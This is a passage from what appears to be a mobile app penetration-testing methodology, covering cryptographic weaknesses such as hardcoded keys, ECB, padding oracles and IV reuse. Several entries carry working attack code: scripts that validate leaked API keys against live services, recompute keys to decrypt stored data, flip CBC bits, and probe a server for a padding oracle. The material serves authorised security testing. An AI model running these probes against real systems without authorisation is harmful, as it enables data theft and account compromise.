  database with the derived key and IV returns readable plaintext matching what the UI displays.
- **Escalation:** → D11 (offline decryption of any exfiltrated database); → D15 if the same constant seeds
  request signing.
- **Ruled out when:** `blutter` resolves the crypto call graph and every key argument traces to a
  `Random.secure()`-derived value, platform-channel Keystore material, or a server-delivered key that is
  not cached alongside the ciphertext — and two clean installs produce different on-disk key material.

### D12-010 · Unity / Xamarin: read the crypto straight out of restored managed code

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `cryptographic_weakness.broken_cryptography.use_of_broken_cryptographic_primitive` (P3) for the mode/algorithm half |
| **Attacker** | AM-01 |
| **Applies to** | Unity IL2CPP, Unity Mono, Xamarin, .NET MAUI |
| **Maps to** | Il2CppDumper (`DummyDll` restored assemblies, `dump.cs`), pyxamstore (`unpack` → DLLs) |

- **Test:** In IL2CPP `dump.cs` and in restored `.dll`s the crypto is plain C#. This is the fastest path to
  a hardcoded-key finding in these stacks.
- **How:**
```bash
Il2CppDumper libil2cpp.so assets/bin/Data/Managed/Metadata/global-metadata.dat out/
grep -nE 'Aes|Rijndael|TripleDES|MD5|SHA1|Rfc2898DeriveBytes|new byte\[\]|Convert\.FromBase64String|CipherMode\.ECB' out/dump.cs | head -60
pyxamstore unpack -d out/assemblies assemblies.blob
ilspycmd out/assemblies/out/App.dll | grep -nE 'Aes|key|IV|Rfc2898|CipherMode' | head -40
```
- **Proof:** A literal key/IV byte array in the decompiled C#, and a successful offline decryption of the
  app's stored data with it.
- **Escalation:** → D11, D19, D23 (entitlement blobs in games are usually protected by exactly this key).
- **Ruled out when:** `dump.cs`/the restored assemblies show every key argument arriving from
  `RandomNumberGenerator`/`RNGCryptoServiceProvider` or from a native platform call into `AndroidKeyStore`,
  and `Rfc2898DeriveBytes` is used with a per-user random salt and a current iteration count.

### D12-011 · Keys shipped in the JS bundle that authenticate server-side

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when it reads or writes other tenants' data; `.pay_per_use_abuse` (P4) when it is only billing-scoped; `.intentionally_public_sample_or_invalid` (P5) when it is a publishable key |
| **Attacker** | AM-01 |
| **Applies to** | React Native, Cordova/Ionic/Capacitor, any bundle-shipping framework |
| **Maps to** | MASTG-TOOL-0125 (apkleaks), MASTG-TOOL-0144 (gitleaks) |

- **Test:** "Public" bundle keys are frequently privileged in practice: Firebase server keys, Algolia admin
  keys, Stripe secret keys, unrestricted map/billing keys. Validate every one; never report a key-shaped
  string.
- **How:**
```bash
strings -n 8 assets/index.android.bundle > hbc.strings
grep -aoE 'AIza[0-9A-Za-z_-]{35}'            hbc.strings | sort -u
grep -aoE '(sk|rk)_(live|test)_[0-9A-Za-z]{16,}' hbc.strings | sort -u
grep -aoE 'AKIA[0-9A-Z]{16}'                 hbc.strings | sort -u
grep -aiE 'admin.?key|master.?key|service.?account|algolia|sendgrid|twilio' hbc.strings
# validate — this step is the finding
curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=x&key=<AIza...>" | head -c 300
aws --profile poc sts get-caller-identity
curl -s -H "X-Algolia-API-Key: <key>" -H "X-Algolia-Application-Id: <app>" \
  "https://<app>-dsn.algolia.net/1/indexes/*/keys"
```
- **Proof:** A live API response authorised by the key that returns data or performs an action the key
  should not permit, with the privilege or billing consequence named — and, for the P1 rating, another
  tenant's record with a marker you can attribute.
- **Escalation:** → D18 (cloud backend), D15 (the key's API surface).
- **Ruled out when:** Each key-shaped string is either restricted (the service rejects your call from an
  unregistered referrer/package/IP with an explicit restriction error), documented by the vendor as
  publishable (Stripe `pk_`, Firebase `apiKey`), or returns 401/403 to every operation you can name. Record
  the exact rejection per key; "it looked like a public key" is not a negative.

### D12-012 · Key derived from a device identifier or other attacker-recomputable value

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insecure_key_generation.insufficient_key_stretching` (varies — rate on the recovered plaintext); `cryptographic_weakness.insufficient_entropy.small_seed_space_in_prng` (P4) |
| **Attacker** | AM-01 (with a device image or backup) / AM-03 (the identifier is often readable locally) |
| **Applies to** | all |
| **Maps to** | ATT&CK T1406, T1426, T1533; MASWE-0014, CWE-331/759/916 |

- **Test:** A key derived from `ANDROID_ID`, IMEI, `Build.SERIAL`, the package name, the install time or
  a fixed salt plus a PIN is recoverable or brute-forceable off-device. It looks per-device and is not.
- **How:**
```bash
grep -rnE 'PBEKeySpec|SecretKeyFactory|PBKDF2|setIterationCount|\.getBytes\(\)|MessageDigest' out/sources/ -B6 -A6 \
  | grep -nE 'ANDROID_ID|Settings\.Secure|Build\.SERIAL|getDeviceId|getImei|getPackageName|currentTimeMillis|firstInstallTime|"salt"'
# read the identifier off the device and recompute
adb shell settings get secure android_id
adb shell getprop ro.serialno
```
```python
import hashlib
from Crypto.Cipher import AES
aid  = bytes.fromhex("<android_id_hex>")
key  = hashlib.sha256(aid + b"com.target.app").digest()          # the derivation you read in the decompile
blob = open("blob.bin","rb").read()
print(AES.new(key, AES.MODE_CBC, blob[:16]).decrypt(blob[16:]))
```
- **Proof:** Recompute the key on your workstation from values you read off the device (or guessed), then
  decrypt the on-device blob and show matching plaintext. For an IMEI/serial derivation, state the search
  space explicitly.
- **Escalation:** → D11 (offline recovery of all protected data from a device image or a backup); → D15 if
  the derived key also signs requests, because you can then forge for arbitrary users.
- **Ruled out when:** The derivation input is a `SecureRandom`-generated per-install secret stored in
  `AndroidKeyStore` (not in a file), confirmed by two clean installs producing different key bytes under
  the D12-002 hook while the device identifiers are identical.

### D12-013 · Cryptographic keys held outside the platform Keystore

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (**P5** — do not file it here); rate the consequence instead via `sensitive_data_exposure.disclosure_of_secrets.*` or `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-03/AM-04 with a read primitive; AM-01 if the key is identical across installs |
| **Applies to** | `AndroidKeyStore` from API 18; `KeyGenParameterSpec` from API 23; StrongBox from API 28 |
| **Maps to** | MASWE-0003 (CWE-312/318/321), MASVS-CRYPTO-2, MASVS-STORAGE-1, LEGACY MSTG-CRYPTO-1/MSTG-STORAGE-1; MobSF NIAP `FCS_STO_EXT.1.1`, `FCS_CKM_EXT.1.1` |

- **Test:** A correctly generated key written to `SharedPreferences`, a file or a DataStore is extractable.
  Oversecured's remediation states the oracle: keys must live in the Keystore, "accessible only via API,
  never direct file access".
- **How:**
```bash
grep -rn 'KeyStore\.getInstance("AndroidKeyStore")\|KeyGenParameterSpec\|KeyProtection\.Builder' out/sources/   # presence = good
grep -rn 'edit()\.putString(' out/sources/ -B6 | grep -inE 'key|secret|iv|seed|salt|passphrase'
adb shell run-as com.target.app sh -c 'cat shared_prefs/*.xml' | grep -iE 'key|secret|iv|salt'
adb shell run-as com.target.app sh -c 'ls -la files/ databases/ no_backup/'
```
```javascript
Java.perform(function () {
  var KS = Java.use('java.security.KeyStore');
  KS.getKey.overload('java.lang.String','[C').implementation = function (a, p) {
    console.log('[KeyStore.getKey] alias=' + a); return this.getKey(a, p); };
});
```
- **Proof:** A base64/hex key value read out of `shared_prefs` or a file that successfully decrypts app
  data, contrasted with the absence of an `AndroidKeyStore` alias for the same purpose in the D12-004 table.
- **Escalation:** → D11 for the read primitive that makes it reachable by someone other than you; → D12-031
  if the key is identical across installs, which converts a local finding into a fleet-wide one.
- **Ruled out when:** The D12-004 alias table contains a key for every encryption purpose, no raw key
  material appears in `shared_prefs`/`files`/`databases` after exercising every flow, and the key handles
  in memory return `null` from `getEncoded()`.

### D12-014 · ECB mode, including the bare `"AES"` transformation

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.broken_cryptography.use_of_broken_cryptographic_primitive` (P3); escalate out of the branch via what you recover |
| **Attacker** | AM-01 (ciphertext off the wire) / AM-03 (ciphertext off disk) |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0232 (static), MASTG-TEST-0350 (runtime), MASWE-0007, MASTG-BEST-0005, rule `mastg-android-broken-encryption-modes`, NIST SP 800-38A, NIST IR 8459; MobSF `android_aes_ecb` / `android_aws_ecb_default`; ASI campaign "Unsafe Encryption Mode" (2020-10-13, `faqs/answer/10046138`) |

- **Test:** `Cipher.getInstance("AES")` silently means **AES/ECB** because ECB is the JCA default — that is
  the form developers do not realise they wrote. Deterministic per-block encryption leaks plaintext
  structure and permits block reordering and cut-and-paste forgery.
- **How:**
```bash
semgrep -c rules/mastg-android-broken-encryption-modes.yaml out/sources/
grep -rnE 'Cipher\.getInstance\(\s*"' out/sources/ | grep -iE '"AES"|ECB|NoPadding'
```
  Runtime, which also catches transformations built by string concatenation — use the `[CIPHER]` hook from
  D12-002. Then demonstrate the structural leak on the app's own data:
```bash
# feed the app two records whose plaintext shares a 16-byte block, then compare the stored ciphertext
adb shell run-as com.target.app sqlite3 databases/app.db "select body from records" | while read r; do echo "$r" | base64 -d | xxd -c16; echo --; done
```
- **Proof:** The transformation string from the trace **plus** two ciphertexts showing byte-identical
  16-byte blocks where the plaintexts shared a block — or the classic ECB pattern on an encrypted image.
- **Escalation:** Block-swap forgery on an encrypted-but-unauthenticated message the server accepts →
  D15 authorisation bypass. MASTG-TEST-0350's "Further Validation Required" step is the triage gate:
  confirm the encrypted data is actually sensitive before rating above Medium.
- **Ruled out when:** Every transformation in the D12-001 census names GCM, CCM, or CBC/CTR paired with a
  verified MAC. **False-positive guard:** `"RSA/ECB/OAEPPadding"` and `"RSA/ECB/PKCS1Padding"` do *not*
  mean RSA uses ECB — `ECB` is a JCA placeholder for RSA. Never report those.

### D12-015 · Broken or withdrawn symmetric algorithm (DES, 3DES, RC4, Blowfish, RC2)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.broken_cryptography.use_of_broken_cryptographic_primitive` (P3) |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0221, MASWE-0007 (CWE-327), MASTG-BEST-0009, rule `mastg-android-broken-encryption-algorithms`; MobSF `android_weak_ciphers`, mobsfscan `weak_cipher`; NowSecure XTool AnyScan (CVE-2025-63432, CVE-2025-63433, CVE-2025-63434, CVE-2025-63435) |

- **Test:** Inspect the algorithm string at `Cipher.getInstance`, `SecretKeyFactory.getInstance` and
  `KeyGenerator.getInstance`, then establish what the primitive protects.
- **How:**
```bash
semgrep -c rules/mastg-android-broken-encryption-algorithms.yaml out/sources/
grep -rniE 'getInstance\(\s*"(DES|DESede|TripleDES|RC4|ARCFOUR|Blowfish|RC2)' out/sources/ -B6 -A6
```
  The retirement facts to quote: **DES** 56-bit, withdrawn by NIST 2005 (FIPS 46-3); **3DES** 64-bit block,
  Sweet32, withdrawn 1 Jan 2024 (SP 800-67 r2); **RC4** predictable keystream, NIST-disapproved 2014,
  IETF-prohibited 2015 (RFC 7465); **Blowfish** 64-bit block, Sweet32, never FIPS-approved.
- **Proof:** Decrypt a real protected blob — update manifest, config, licence, credential — with the
  recovered algorithm and key. NowSecure's XTool case is the shape: **DES with a hardcoded key and IV**
  protecting update metadata in `com.xtool.dcloud.RemoteServiceProxy`, which made the whole update channel
  forgeable:
```python
from Crypto.Cipher import DES
from base64 import b64decode
KEY = IV = b"\x2A\x10\x2A\x10\x2A\x10\x2A"
print(DES.new(KEY, DES.MODE_ECB).decrypt(b64decode(open("meta.b64").read())))
```
- **Escalation:** → D17 supply-chain code execution when it protects an update or config channel; → D11/D15
  otherwise.
- **Ruled out when:** Each hit is in a third-party namespace you can attribute (`org.bouncycastle`,
  `com.google.*` test fixtures) **and** no first-party call site reaches it, or the primitive is used for a
  non-security purpose you can name (a legacy interop format with no secrecy requirement). MASTG requires
  the "Further Validation" step: report only where the algorithm protects sensitive data.

### D12-016 · Weak hash making a security decision (MD5 / SHA-1 / MD4)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.weak_hash.predictable_hash_collision` (varies — by impact); `cryptographic_weakness.broken_cryptography.use_of_broken_cryptographic_primitive` (P3) |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | MASWE-0008 (CWE-328), MASWE-0009 (CWE-354/807); MobSF `android_md5`, `android_sha1`, `android_weak_hash`; MobSF NIAP `FCS_COP.1.1(2)`, `FCS_COP.1.1(4)`; RFC 6151 |

- **Test:** The finding is never "MD5 exists" — it is "MD5 decides a security outcome". Trace every digest
  to its consumer and keep only the ones that gate integrity, authentication or password storage.
- **How:**
```bash
grep -rniE 'MessageDigest\.getInstance\("(md5|md4|sha-?1)"\)|DigestUtils\.(md5|sha)\(|Hashing\.(md5|sha1)\(' out/sources/ -B6 -A6
# then read the consumer: comparison? cache key? signature? password?
grep -rn 'MessageDigest\.isEqual\|Arrays\.equals\|\.equals(' out/sources/ -B4 | grep -iE 'digest|hash|signature|checksum'
grep -rniE 'Mac\.getInstance\("Hmac(MD5|SHA1)"\)|Signature\.getInstance\("(MD5|SHA1)with' out/sources/
```
- **Proof:** The digest feeding an integrity or authentication decision, and an input that passes the check
  which should not — a modified update file with a recomputed MD5, or a recovered password from an unsalted
  stored digest.
- **Escalation:** → D17 (malicious update accepted), D02 (repack accepted), D13 (password recovery).
  MD5/SHA-1 used as a *MAC* is MASWE-0009 and rates above the same primitive used as a cache key.
- **Ruled out when:** Every MD5/SHA-1 hit resolves to a non-security use you can name — cache key, ETag,
  dedup identifier, file-name derivation, a third-party library's internal bookkeeping — with the consumer
  cited by `file:line`. Record the list; this is the most commonly over-reported item in the domain.

### D12-017 · CBC without integrity — ciphertext malleability on a field the app or server trusts

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies — CWE-325); `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) if the flipped field is an identifier the server honours |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | MASWE-0007, MASWE-0009; mobsfscan `cbc_static_iv`, `cbc_padding_oracle` |

- **Test:** Unauthenticated CBC is malleable. If the app or its API decrypts a blob and then trusts a field
  inside it, you can flip bits in block *n* to control the plaintext of block *n+1* at the cost of
  corrupting block *n* — and if block *n* is padding, parsing slack or an ignored field, the corruption is
  free.
- **How:**
```bash
grep -rnE 'Cipher\.getInstance\("[^"]*CBC[^"]*"\)' out/sources/
grep -rn 'Mac\.getInstance\|GCMParameterSpec\|HmacSHA256\|\.doFinal' out/sources/ | grep -ci 'mac'   # absence is the tell
```
```python
# flip a byte in ciphertext block n to change the corresponding byte of plaintext block n+1
ct = bytearray(open("ct.bin","rb").read())
BS = 16
target_block, offset = 1, 7            # plaintext byte to change
ct[(target_block-1)*BS + offset] ^= (ord('0') ^ ord('9'))
open("ct_flipped.bin","wb").write(ct)
```
- **Proof:** The app or the API accepting the modified ciphertext and acting on the changed field — an
  entitlement flipping, a user id changing, a price changing — with the before/after server response
  **bodies** diffed, not the status codes.
- **Escalation:** → D15 (authorisation bypass over a now-controllable identifier), D23 (entitlement).
- **Ruled out when:** Every CBC transformation in the census is paired with a verified MAC over the
  ciphertext (encrypt-then-MAC, tag compared with `MessageDigest.isEqual`) or the app uses GCM/CCM
  throughout, **and** a deliberate single-bit flip produces an authentication failure rather than a
  corrupted-but-accepted plaintext.

### D12-018 · Padding oracle: CBC + PKCS#5/7 with a distinguishable decrypt failure

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.side_channel_attack.padding_oracle_attack` (**P4** — the crypto-native cap); exit via `broken_authentication_and_session_management.authentication_bypass` (P1) if you decrypt or forge an identity blob |
| **Attacker** | AM-01 |
| **Applies to** | all; the static tell is CBC/PKCS5 with no `Mac`/`GCM` anywhere nearby |
| **Maps to** | MASWE-0007; mobsfscan `cbc_padding_oracle`, `cbc_kotlin_padding_oracle`; MobSF `cbc_padding_oracle` (CWE-649) |

- **Test:** Where the app or its API decrypts attacker-supplied ciphertext and distinguishes a padding
  error from any other error — by status, body, length or timing — you can decrypt and forge without the
  key.
- **How:**
```bash
grep -rnE 'CBC/PKCS(5|7)Padding|BadPaddingException|IllegalBlockSizeException' out/sources/ -B6 -A6
```
```bash
# n>=10 interleaved trials per group, randomised order — never a single shot
python3 - <<'PY'
import random, statistics, requests
CT   = "<base64 ciphertext>"
BAD  = "<same ciphertext, last byte of penultimate block flipped>"
res  = {"valid": [], "bad": []}
trials = [("valid", CT), ("bad", BAD)] * 10
random.shuffle(trials)
for g, c in trials:
    r = requests.post("https://api.target/v1/x", data={"c": c}, timeout=10)
    res[g].append((r.status_code, len(r.content), r.elapsed.total_seconds()))
for g in res:
    st = [x[0] for x in res[g]]; ln = [x[1] for x in res[g]]; t = [x[2] for x in res[g]]
    print(g, "status", set(st), "len mean", statistics.mean(ln),
          "t mean", round(statistics.mean(t),4), "sigma", round(statistics.pstdev(t),4))
PY
```
  Then run `padbuster`/a custom oracle only once the differential is established.
- **Proof:** A reproducible **body** difference (or a timing difference where the suspect group's mean is
  ≥ 2σ above the control's, over n ≥ 10 interleaved trials) between padding-invalid and
  padding-valid-but-semantically-invalid ciphertexts — followed by a recovered plaintext or a forged blob
  the server accepts.
- **Escalation:** Forge an encrypted identity blob → D15 authorisation bypass / D13 ATO.
- **Ruled out when:** (a) Both groups return a byte-identical body and a timing distribution whose means are
  within 2σ — **the Body-Diff Rule: a status-code-only differential is not an oracle**; or (b) the
  differentiator tracks a fixed deny-list rather than your input (Server-Policy-vs-State); or (c) **the
  layer-ordering check**: a malformed-ciphertext error returned to an *unauthenticated* request does not
  prove the decryption ran — re-test with a minimal well-formed authenticated request before claiming the
  oracle, because a body parser or schema validator in front of the decrypt path produces the same shape.

### D12-019 · Static or predictable IV

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `cryptographic_weakness.insufficient_entropy.predictable_initialization_vector` (P4, CWE-340) |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | MASWE-0007; mobsfscan `cbc_static_iv`; MobSF `android_weak_iv` (CWE-329; patterns `0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00` and `0x01,0x02,0x03,0x04,0x05,0x06,0x07`) |

- **Test:** `IvParameterSpec(new byte[16])`, an IV derived from the key, an IV hardcoded as a string, or the
  same IV across encryptions destroys semantic security and enables first-block manipulation.
- **How:**
```bash
grep -rn 'IvParameterSpec' out/sources/ -B6 -A2 | grep -inE 'new byte\[|"[0-9A-Fa-f]{16,}"|getBytes\(\)|0x00, *0x00'
grep -rn 'setRandomizedEncryptionRequired' out/sources/     # false on a Keystore key = caller supplies the IV
```
  Use the `[IV]` hook from D12-002 and encrypt the same plaintext twice across separate app runs.
- **Proof:** The same IV hex printed across separate encryptions, or byte-identical ciphertexts for
  identical plaintexts across two app runs — `xxd` both blobs side by side in the report.
- **Escalation:** With CBC and a decryption oracle this becomes D12-018 (a padding oracle, P4); with CTR or
  GCM it becomes D12-020, which is far worse.
- **Ruled out when:** Two encryptions of the same plaintext, in separate process lifetimes, produce
  ciphertexts that differ in the first block and in every subsequent block, and the IV printed by the hook
  differs between them. Note: the plain observation "the IV is reused" with no impact is
  `insufficient_entropy.initialization_vector_reuse` = **P5** — Graveyard it unless you carry it.

### D12-020 · IV / nonce reuse under a fixed key (CTR keystream reuse, GCM forgery)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insufficient_entropy.initialization_vector_reuse` (**P5** on its own); rate the recovered plaintext or the forgery instead |
| **Attacker** | AM-01 |
| **Applies to** | all; the Android guidance is explicit — "Avoid IV/counter reuse in CTR mode. Ensure that they're cryptographically random" |
| **Maps to** | MASWE-0007, CWE-1204; `privacy-and-security/security-tips` (Cryptography) |

- **Test:** CTR nonce reuse under one key XORs two plaintexts together; GCM nonce reuse under one key leaks
  the authentication subkey and lets you forge tags for arbitrary messages. This is categorically worse
  than CBC IV reuse and must not be filed as the same item.
- **How:**
```bash
grep -rnE 'Cipher\.getInstance\("[^"]*(CTR|GCM)[^"]*"\)' out/sources/ -B8 -A4
grep -rn 'GCMParameterSpec' out/sources/ -B6 -A2
```
  Collect a corpus of ciphertexts and look for repeated nonces:
```python
import base64, collections
nonces = collections.Counter()
for line in open("ciphertexts.txt"):
    raw = base64.b64decode(line.strip())
    nonces[raw[:12]] += 1            # 12-byte GCM nonce prefix
print([ (n.hex(), c) for n, c in nonces.most_common(10) if c > 1 ])
```
  For CTR, XOR two ciphertexts sharing a nonce and crib-drag against known JSON structure.
- **Proof:** Two ciphertexts carrying an identical nonce under the same key, plus the recovered plaintext
  from the XOR (CTR) or a forged GCM tag the app/server accepts.
- **Escalation:** GCM forgery under a reused nonce is a full integrity break → D15/D23.
- **Ruled out when:** The nonce corpus shows no repeats over a sample of at least a few hundred
  ciphertexts, **and** the nonce source is `SecureRandom` (or a monotonic counter that is persisted across
  process restarts and never reset). A counter that resets on reinstall while the key persists in the
  Keystore is the reportable case.

### D12-021 · Non-standard GCM IV length, or a bundled provider re-enabling what the platform refuses

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insecure_implementation.improper_following_of_specification` (varies); `cryptographic_weakness.broken_cryptography.use_of_vulnerable_cryptographic_library` (P4) |
| **Attacker** | AM-01 |
| **Applies to** | **Android 12 (API 31)+** — BouncyCastle removed in favour of Conscrypt |
| **Maps to** | `developer.android.com/about/versions/12/behavior-changes-all` — BouncyCastle removed, 512-bit AES unsupported, invalid `KeyGenerator` key sizes rejected, "GCM ciphers initialized with non-12-byte sizes" rejected; `risks/broken-cryptographic-algorithm` |

- **Test:** Android 12 started rejecting three specific things. Apps that hit these commonly added
  `org.bouncycastle:bcprov-jdk15to18` and **re-registered it as a provider**, restoring exactly the
  parameters the platform refused. That deliberate routing-around is the finding.
- **How:**
```bash
grep -rn 'Security\.insertProviderAt\|Security\.addProvider\|BouncyCastleProvider\|getInstance\([^)]*,\s*"BC"' out/sources/
grep -rn 'GCMParameterSpec\|IvParameterSpec' out/sources/ -A2 | grep -nE 'new byte\[(8|16)\]'
grep -rnE '\.init\(\s*512\s*\)|setKeySize\(\s*512\s*\)' out/sources/
unzip -l base.apk | grep -i 'bcprov\|bcpkix\|spongycastle'
```
- **Proof:** A bundled BC provider inserted at priority 1 **and** a GCM init with a 16-byte IV (or a
  512-bit AES key), i.e. the app restoring a configuration the platform deliberately rejects — with the
  bundled `bcprov` version recorded so the library CVE exposure can be argued alongside.
- **Escalation:** → D12-020 (nonce-misuse-prone GCM), D12-072 (vulnerable bundled library), D17
  (supply chain).
- **Ruled out when:** No provider is registered by the app, every `GCMParameterSpec` IV is 12 bytes, and no
  `KeyGenerator` size outside the platform-accepted set appears. If the app targets < API 31 the platform
  check never fires — say so and rate on the parameter itself, not on the bypass.

### D12-022 · RSA without OAEP (PKCS#1 v1.5 or `NoPadding`)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.broken_cryptography.use_of_broken_cryptographic_primitive` (P3); `cryptographic_weakness.side_channel_attack.padding_oracle_attack` (P4) if you build a Bleichenbacher oracle |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | MASWE-0007; MobSF `android_rsa_no_oaep` (CWE-780, masvs `crypto-3`); mobsfscan `rsa_no_oeap`; QARK `rsa_cipher_usage.py` |

- **Test:** `RSA/ECB/NoPadding` is malleable outright; `RSA/ECB/PKCS1Padding` for *encryption* is
  Bleichenbacher-vulnerable wherever the counterpart distinguishes malformed ciphertexts.
- **How:**
```bash
grep -rniE 'Cipher\.getInstance\("rsa/[^"]*/(no|pkcs1)padding"' out/sources/ -B6 -A6
grep -rn 'Cipher\.getInstance\("RSA' out/sources/ | grep -vi oaep
```
  Then probe the decrypting side with malformed ciphertexts using the same interleaved-trial harness as
  D12-018.
- **Proof:** The call site plus a demonstrated response differential to malformed RSA ciphertexts, or a
  demonstrated malleability (a modified ciphertext producing a predictably modified plaintext) on
  `NoPadding`.
- **Escalation:** → D12-018 methodology for the oracle; → D15 if the RSA-wrapped value is a session key.
- **Ruled out when:** Every RSA encryption call names `OAEPPadding`/`OAEPWithSHA-256AndMGF1Padding`, and
  the only `PKCS1Padding` occurrences are on `Signature` (where PKCS#1 v1.5 signatures are acceptable) or
  on the `"RSA/ECB/..."` JCA placeholder — which, again, is not ECB.

### D12-023 · Home-grown "encryption" that is a XOR loop

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insecure_implementation.improper_following_of_specification` (varies); rate on the recovered secret |
| **Attacker** | AM-01 |
| **Applies to** | all — very high hit rate in obfuscation, licensing and "secure config" code |
| **Maps to** | mobsfscan `android_custom_xor_crypto` / `android_kotlin_custom_xor_crypto` ("A cryptography-named method uses XOR directly"); MASWE-0047 (Using Non-Standard APIs for Security-Critical Functionality); LEGACY MSTG-CRYPTO-2 |

- **Test:** A method whose *name* implies cryptography and whose *body* is a XOR loop. Rarely checked,
  frequently present.
- **How:**
```bash
grep -rniE '(encrypt|decrypt|cipher|crypt|obfusc|scramble|protect)' out/sources/ -A20 | grep -nE '\^|xor' | head -60
# smali is often clearer for the loop shape
grep -rn 'xor-int\|xor-long\|xor-int/lit8' out/smali/ -B12 | grep -inE 'encrypt|decrypt|key'
```
- **Proof:** Recover the key by XORing a known plaintext against its stored ciphertext, then decrypt a
  second, previously unknown blob with the same key and show the plaintext. Two blobs is the proof; one is
  a guess.
- **Escalation:** → D13 (credentials), D23 (entitlements), D21 (if it protects an integrity check).
- **Ruled out when:** Every cryptographically-named method delegates to `javax.crypto` / `java.security` /
  Tink / libsodium, and the XOR hits resolve to hash mixing, checksum computation or bit-field packing with
  the call site cited.

### D12-024 · Encoding presented as encryption, and reversible custom transforms on identity parameters

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | rate as the underlying exposure: `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) on disk, or `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) once you control the parameter |
| **Attacker** | AM-01 / AM-03 |
| **Applies to** | all |
| **Maps to** | sec-88 InsecureBankv2 (`Base64.decode(username, 0)` in `MyBroadCastReceiver` while only the password used AES); Voorivex/MyIrancell stage 3 (login phone number appeared as `4n5lcipUYfhzJ3QeTUVz`) |

- **Test:** Two related shapes. First, values that look encrypted but are only encoded. Second — the higher
  value one — a custom reversible transform on an identity parameter, which converts into free parameter
  control once you write the codec.
- **How:**
```bash
grep -rn 'Base64\.encodeToString\|Base64\.decode\|android\.util\.Base64' out/sources/ | grep -iE 'password|token|pin|secret|user|phone'
adb shell run-as com.target.app sh -c 'cat shared_prefs/*.xml' \
  | grep -oE '[A-Za-z0-9+/]{20,}={0,2}' | while read v; do echo "$v" | base64 -d 2>/dev/null; echo; done
```
  For the custom transform: capture the same plaintext encoded twice — identical output means no IV or
  nonce, i.e. an encoding, not encryption. Then diff single-character changes to map the alphabet.
- **Proof:** For encoding-as-encryption, the decoded plaintext credential. For the custom transform, a
  working encoder that turns an arbitrary phone number or user id into a value the server accepts — that
  encoder is the finding.
- **Escalation:** → D15 IDOR/BOLA over the now-controllable identifier; → D11 as plaintext storage.
- **Ruled out when:** Encoding the same plaintext twice produces different outputs (so a nonce or IV is
  present), and the decode attempts across every opaque field in `shared_prefs`, the DB and the request
  body produce no readable plaintext.

### D12-025 · Insufficient key size

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `cryptographic_weakness.insecure_key_generation.insufficient_key_space` (P3, CWE-326/331/522) |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0208, MASWE-0013, MASTG-KNOW-0012, rule `mastg-android-key-generation-with-insufficient-key-length`; mobsfscan `weak_key_size`; MobSF NIAP `FCS_CKM.1.1(1)`, `FCS_CKM.1.1(2)` |

- **Test:** Read the size argument to `KeyGenerator.init(int)`, `KeyPairGenerator.initialize(int)` and
  `KeyGenParameterSpec.Builder.setKeySize(int)`.
- **How:**
```bash
semgrep -c rules/mastg-android-key-generation-with-insufficient-key-length.yml out/sources/
grep -rnE 'KeyGenerator\.getInstance|KeyPairGenerator\.getInstance' out/sources/ -A6 | grep -E '\.init\(|\.initialize\('
grep -rnE '\.(init|initialize|setKeySize)\(\s*(64|128|512|768|1024)\s*\)' out/sources/
```
- **Proof:** The call site and the numeric size — e.g. `KeyPairGenerator.initialize(1024)` for RSA, EC below
  224, or a 64-bit symmetric key.
- **Escalation:** A weak RSA key that signs something the app trusts → D17/D21 (forge the integrity check).
- **Ruled out when:** Every symmetric key is 256-bit (or 128-bit with the program's acceptance), every RSA
  key is ≥ 2048, every EC key is ≥ 224. **Rating honesty:** MASTG-TEST-0208's stated bar includes "a
  128-bit key size is considered insufficient for AES … considering quantum computing attacks" — that is
  forward-looking. Report RSA-1024 as Medium; treat AES-128 as Informational/hardening unless the program
  says otherwise, or the finding gets closed and takes the rest of your report's credibility with it.

### D12-026 · Insufficient key stretching — plain hash, PBKDF1, or low-iteration PBKDF2

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insecure_key_generation.insufficient_key_stretching` (varies — rate on the recovered plaintext) |
| **Attacker** | AM-01 with a pulled blob / AM-03 with a read primitive |
| **Applies to** | all |
| **Maps to** | MASWE-0014 (CWE-326/327/759/760/916), MASWE-0008, NIST SP 800-132, OWASP Password Storage Cheat Sheet. **No Android MASTG-TEST covers KDF misuse — cite this as a MASTG gap rather than inventing a test id** |

- **Test:** Keys derived from passwords or PINs must use PBKDF2, scrypt or Argon2 with a per-user random
  salt and a current work factor. A single SHA-256 over a password is the bug; so is
